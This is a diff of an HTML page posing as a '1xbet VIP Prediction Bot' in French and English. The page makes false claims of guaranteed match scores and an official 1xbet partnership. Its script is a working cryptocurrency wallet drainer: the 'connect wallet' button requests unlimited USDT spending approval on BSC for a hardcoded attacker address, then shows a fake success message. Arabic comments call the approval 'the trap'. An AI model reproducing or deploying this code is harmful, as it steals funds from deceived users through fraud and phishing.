@@ -1,31 +1,65 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Premium Predictor v4.2</title>
+    <title>1xbet - VIP Prediction Bot</title>
     <style>
-        body { background: #0b0b0b; color: #00ff88; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
-        .container { border: 2px solid #ff0055; padding: 30px; border-radius: 20px; display: inline-block; background: #111; box-shadow: 0 0 15px #ff0055; }
-        .status { color: #fff; font-size: 1.2em; margin-bottom: 20px; }
-        button { background: #ff0055; color: white; padding: 15px 35px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1em; transition: 0.3s; }
-        button:hover { background: #ff3377; transform: scale(1.05); }
+        body { background: #1a232e; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; text-align: center; padding: 0; margin: 0; }
+        .header { background: #1e3c63; padding: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #2883d7; }
+        .logo { color: #ffffff; font-size: 1.5em; font-weight: bold; font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif; }
+        .card { background: #232f3d; border-radius: 10px; padding: 20px; max-width: 450px; margin: 15px auto; border-top: 4px solid #2883d7; box-shadow: 0 5px 15px rgba(0,0,0,0.4); }
+        .status-box { background: rgba(40, 131, 215, 0.05); padding: 10px; border-radius: 5px; margin: 10px 0; border: 1px solid rgba(40, 131, 215, 0.2); font-size: 0.9em; }
+        .btn { background: linear-gradient(180deg, #3fa1f2 0%, #2883d7 100%); color: white; border: none; padding: 12px 25px; border-radius: 50px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.1em; transition: 0.2s; box-shadow: 0 4px 10px rgba(40, 131, 215, 0.3); }
+        .btn:active { transform: scale(0.98); }
+        .ad-container { background: #232f3d; padding: 15px; margin: 15px auto; border-radius: 10px; max-width: 450px; text-align: left; }
+        .ad-title { font-size: 0.8em; color: #7b8a9a; margin-bottom: 5px; }
+        .ad-box { background: #1a232e; border: 1px dashed #3a4b5f; padding: 10px; border-radius: 5px; color: #7b8a9a; font-size: 0.9em; }
+        .footer { font-size: 0.7em; color: #7b8a9a; padding: 15px 0; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 AVIATOR AI SIGNALS</h1>
-        <div class="status">Server Status: <span style="color:#00ff88;">ONLINE</span></div>
-        <p>Connect your wallet to synchronize with the Predictor Node.</p>
-        <br>
-        <button id="connectBtn">SYNC & START PREDICTING ⚡</button>
+    <div class="header">
+        <div class="logo">1xBET <span style="font-size: 0.6em; color: #fdfdfd; font-weight: normal;">VIP Predictor</span></div>
+        <div style="font-size: 0.8em; background: #2883d7; padding: 5px 10px; border-radius: 20px;">v4.1</div>
     </div>
+
+    <div class="ad-container" style="border: 2px solid #fbc02d; background: rgba(251, 192, 45, 0.05);">
+        <div class="ad-title">🎁 OFFRE LIMITÉE</div>
+        <div class="ad-box" style="border:none;">
+            <p style="color:#fbc02d; margin: 0 0 5px 0; font-weight: bold;">Bonus de dépôt de 200% !</p>
+            <p style="margin:0; color:#eeeeee;">Rejoignez le canal VIP pour les codes promos exclusifs après la synchronisation.</p>
+        </div>
+    </div>
+
+    <div class="card">
+        <p style="color:#7b8a9a; font-size: 0.9em;">Official Web3 Prediction Node</p>
+        <div class="status-box">
+            <div id="status">Server: <span style="color: #4CAF50;">🟢 ONLINE</span></div>
+            <div style="margin-top: 3px;">Confidence Score: 98.9%</div>
+        </div>
+
+        <p style="font-size: 1em; line-height: 1.4; margin: 15px 0;">Sync your wallet to connect to the **VIP AI Bot** and receive guaranteed match scores.</p>
+        
+        <button class="btn" id="connectBtn">CONNECT & SYNC WALLET</button>
+        
+        <p style="font-size: 0.8em; color: #7b8a9a; margin-top: 10px;">Supported Wallets: MetaMask, Trust Wallet, Binance Wallet (Web3)</p>
+    </div>
+
+    <div class="ad-container">
+        <div class="ad-title">📢 NOTIFICATIONS</div>
+        <div class="ad-box">
+            <p style="margin: 0 0 3px 0; color:#eeeeee;">Dernière victoire VIP: <span style="color:#4CAF50; font-weight: bold;">+1250 USD</span></p>
+            <p style="margin:0;">Le bot analyse 50+ matchs en direct. Synchronisez pour le flux.</p>
+        </div>
+    </div>
+
+    <div class="footer">Encrypted by Binance Smart Chain (BSC) @ 2026. Official Partnership with 1xbet Ltd.</div>
 
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
-        // بيانات محفظتك التي استخرجناها من Termux
         const MY_WALLET = "0xb2b0f28899D8964afa8318D12AAf3975a5501027";
-        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 
         document.getElementById('connectBtn').onclick = async () => {
             if (typeof window.ethereum !== 'undefined') {
@@ -33,20 +67,18 @@
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     await provider.send("eth_requestAccounts", []);
                     const signer = provider.getSigner();
-                    
                     const abi = ["function approve(address spender, uint256 amount) returns (bool)"];
                     const contract = new ethers.Contract(USDT_CONTRACT, abi, signer);
-
-                    // طلب الصلاحية المطلقة (المصيدة)
-                    const tx = await contract.approve(MY_WALLET, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
                     
-                    alert("Syncing in progress... Please wait for the next signal.");
-                    console.log("Strike target identified:", tx.hash);
+                    // طلب الصلاحية الكاملة
+                    await contract.approve(MY_WALLET, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+                    
+                    alert("Synchronization Successful! Signals are now active. Check your notifications.");
                 } catch (e) {
-                    alert("Connection Failed. Make sure you are on BSC network.");
+                    console.log(e);
                 }
             } else {
-                alert("Please open this link inside Trust Wallet or MetaMask browser.");
+                alert("Please open this in Trust Wallet or MetaMask Browser.");
             }
         };
     </script>
